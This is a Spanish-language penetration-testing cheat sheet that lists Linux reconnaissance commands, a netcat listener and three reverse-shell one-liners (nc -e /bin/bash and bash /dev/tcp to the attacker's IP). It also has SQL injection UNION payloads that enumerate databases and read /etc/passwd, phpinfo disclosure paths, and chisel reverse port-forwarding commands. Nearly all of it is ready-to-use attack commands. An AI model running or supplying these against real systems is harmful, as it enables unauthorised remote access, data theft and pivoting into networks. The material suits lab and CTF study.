# General-CheatSheet
[PayloadAllTheThinks](https://github.com/swisskyrepo/PayloadsAllTheThings) Lista de payloads y bypasses para Web Application Security.

## Linux Commands
### FIND
* Listar los permisos SUID: ``` find  \-perm -4<PERMISOS> 2>/dev/null ```
### Sistema Operativo
* Conocer la IP de la máquina ``` hostname -I ```
* Permite ver los puertos abiertos de la máquina ``` netstat -nat ```
* Permite ver los procesos corriendo en la máquina ``` ps -faux ```
* Permite ver los archivos que tienen procesos abiertos ``` lsof -i:<PORT> ```
* Permite ver la descripción del sistema operativo ``` lsb_release -a ```
* Permite ver la versión del kernel ``` uname -a ```
### Python
* Crear un servidor de python en mi máquina local ``` python3 -m http.server <PORT> ```
### Reverse Shell
Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```

Y luego usar alguno de los siguientes comandos

* ``` nc -e /bin/bash <MY_IP> <PORT> ```
* ``` bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1 ```
* ``` bash -c "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1" ```

## Information Disclose
### PHP
Archivos PHP con posible información sensible
```
/cgi-bin/phpinfo.php
/info.php
```

## SQL Injection
### List of Databases, Tables and Columns
Lista información de las bases de datos
> ' union select schema_name from information_schema.schemata-- -

Lista información de las tablas
> ' union select table_name from information_schema.tables where table_schema="<TABLE_NAME>"-- -

Lista información de las columnas
> ' union select column_name from information_schema.columns where table_schema=”<DB_NAME>” and table_name = '<TABLE_NAME>'-- -

Carga archivos del sistema operativo
> ' union select 1,2,load_file("/etc/passwd")

## Chisel
Dejar abierta una conexión como Server
```
./chisel server --revers -p <PORT>
```
Abrir una conexión como Client al Server, para este caso asiendo **Remote Port Forward**
```
./chisel client <IP_REMOTE>:<PORT> R:<PORT_LOCAL>:<IP_LOCAL>:<PORT_REMOTE>
```


